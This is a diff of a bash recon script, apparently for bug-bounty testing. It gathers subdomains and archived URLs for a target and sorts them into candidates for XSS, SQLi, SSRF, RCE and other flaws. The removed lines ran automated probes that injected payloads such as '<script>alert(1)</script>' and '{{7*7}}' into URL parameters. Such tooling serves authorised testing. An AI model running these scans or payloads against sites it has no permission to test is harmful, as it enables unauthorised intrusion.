@@ -21,6 +21,45 @@ xargs -a saida.txt -n2 -I{} bash -c "echo -e '\n[URL]: {}\n'; python3 /linkfinde
 echo
 echo
 
+echo ================"INIT C4NG4CRAWL"================ | anew allurls
+echo
+echo
+subfinder -d $url | httpx-toolkit -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx-toolkit -silent | anew | waybackurls | anew allurls';
+echo
+echo ================"INIT XSS"================ | anew xss
+echo
+cat allurls | gf xss | anew xss;
+echo
+echo ================"INIT LFI"================ | anew lfi
+echo
+cat allurls | gf lfi | anew lfi;
+echo
+echo ================"INIT REDIRECT"================ | anew redirect
+echo
+cat allurls | gf redirect | anew redirect;
+echo
+echo ================"INIT RCE"================ | anew rce
+echo
+cat allurls | gf rce | anew rce;
+echo
+echo ================"INIT SSTI"================ | anew ssti
+echo
+cat allurls | gf ssti | anew ssti;
+echo
+echo ================"INIT SQLI"================ | anew sqli
+echo
+cat allurls | gf sqli | anew sqli;
+echo
+echo ================"INIT IDOR"================ | anew idor
+echo
+cat allurls | gf idor | anew idor;
+echo
+echo ================"INIT SSRF"================ | anew ssrf
+echo
+cat allurls | gf ssrf| anew ssrf;
+echo
+echo
+
 echo ================"INIT SUBFINDER"================ | anew subfinder
 echo
 echo
@@ -74,54 +113,6 @@ echo ================"INIT WHATWEB"================ | anew whatweb
 echo
 echo
 whatweb $(cat url) | anew whatweb;
-echo
-echo
-echo
-
-echo ================"INIT XSSTRIKE"================ | anew xsstrike
-echo
-echo
-python3 ../xsstrike.py -u $(cat url) | anew xsstrike;
-echo
-echo
-echo
-
-echo ================"INIT SSTI"================ | anew ssti
-echo
-echo
-echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '{{7*7}}' | freq | egrep -v 'Not' | anew ssti;
-echo
-echo
-echo
-
-echo ================"INIT XSS1"================ | anew xss1
-echo
-echo
-echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
-echo
-echo
-echo
-
-echo ================"INIT XSS2"================ | anew xss2
-echo
-echo
-echo $(cat url) | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
-echo
-echo
-echo
-
-echo ================"INIT XSS3"================ | anew xss3
-echo
-echo
-echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
-echo
-echo
-echo
-
-echo ================"INIT XSS4"================ | anew xss4
-echo
-echo
-gau $(cat url) | httpx-toolkit -silent | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss4;
 echo
 echo
 echo
